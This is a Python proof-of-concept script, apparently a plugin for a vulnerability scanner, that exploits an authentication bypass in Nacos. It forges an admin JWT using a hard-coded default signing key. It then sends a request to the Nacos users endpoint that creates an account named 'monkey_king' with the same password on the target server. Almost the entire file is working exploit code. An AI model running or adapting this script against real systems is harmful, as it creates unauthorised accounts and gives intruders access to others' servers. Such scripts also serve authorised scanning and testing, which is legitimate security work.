'''
Function:
    nacos 任意用户创建
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import json
import base64
import hashlib
import hmac
import time
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json, text/plain, */*'
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def create_jwt(self):
        secret_key = b'I\xe7+z\xd2\x9e\xcbMv\xdf\x8ez\xef\xcft\xd7m\xf8\xe7\xae\xfc\xf7Mv\xdf\x8ez\xef\xcft\xd7m\xf8\xe7\xae\xfc\xf7Mv\xdf\x8ez\xef\xcft\xd7m\xf8\xe7\xae\xfc'
        headers = {
            "alg": "HS256",
        }
        payload = {"sub": "nacos", "exp": int(time.time()) + 18000}
        first = base64.urlsafe_b64encode(json.dumps(headers, separators=(',', ':')).encode('utf-8').replace(b'=', b'')).decode('utf-8').replace('=', '')
        second = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode('utf-8').replace(b'=', b'')).decode('utf-8').replace('=', '')
        first_second = f"{first}.{second}"
        third = base64.urlsafe_b64encode(hmac.new(secret_key, first_second.encode('utf-8'), hashlib.sha256).digest()).decode('utf-8').replace('=', '')
        token = ".".join([first, second, third])
        return token

    def vuln(self, netloc, scheme, token):
        url = "{}://{}/nacos/v1/auth/users".format(scheme, netloc)
        data = {
            "username": "monkey_king",
            "password": "monkey_king"
        }
        self.headers["Authorization"] = "Bearer {}".format(token)
        self.headers["Connection"] = "close"
        try:
            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if "create user ok" in result.text or "already exist" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意用户注册漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                for param, value in data.items():
                    values = param+"="+value
                    self.value_list.append(values)
                self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                return True
            elif result.status_code == 404:
                url1 = "{}://{}/v1/auth/users".format(scheme, netloc)
                result = requests.post(url=url1, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if "create user ok" in result.text or "already exist" in result.text:
                    target = urlparse(url1)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意用户注册漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    for param, value in data.items():
                        values = param + "=" + value
                        self.value_list.append(values)
                    self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                    return True
                else:
                    return False
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        token = self.create_jwt()
        if self.vuln(netloc=netloc, scheme=scheme, token=token):
            return self.result_text
        else:
            return False


